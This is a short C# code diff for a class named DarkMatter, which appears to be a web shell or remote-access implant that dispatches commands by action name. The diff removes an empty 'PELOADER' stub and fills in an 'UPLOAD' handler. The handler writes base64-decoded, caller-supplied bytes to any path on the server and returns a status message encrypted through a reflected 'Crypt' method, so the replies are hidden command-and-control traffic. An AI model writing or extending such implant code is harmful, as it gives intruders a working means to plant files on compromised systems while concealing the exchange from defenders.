@@ -102,13 +102,22 @@ public class DarkMatter
             {
                 
             }
-            else if (szAction == "PELOADER")
-            {
-                
-            }
             else if (szAction == "UPLOAD")
             {
-                
+                string szPath = dic["path"];
+                byte[] abBuffer = Convert.FromBase64String(dic["buffer"]);
+
+                using (FileStream fs = new FileStream(szPath, FileMode.Append, FileAccess.Write))
+                    fs.Write(abBuffer, 0, abBuffer.Length);
+
+                string szOutput = "Wrote file chunk: " + abBuffer.Length.ToString();
+                byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
+                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
+                byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});
+
+                response.Clear();
+                response.ContentType = "application/octet-stream";
+                response.BinaryWrite(abEncryptedResp);
             }
         }
         catch (Exception ex)
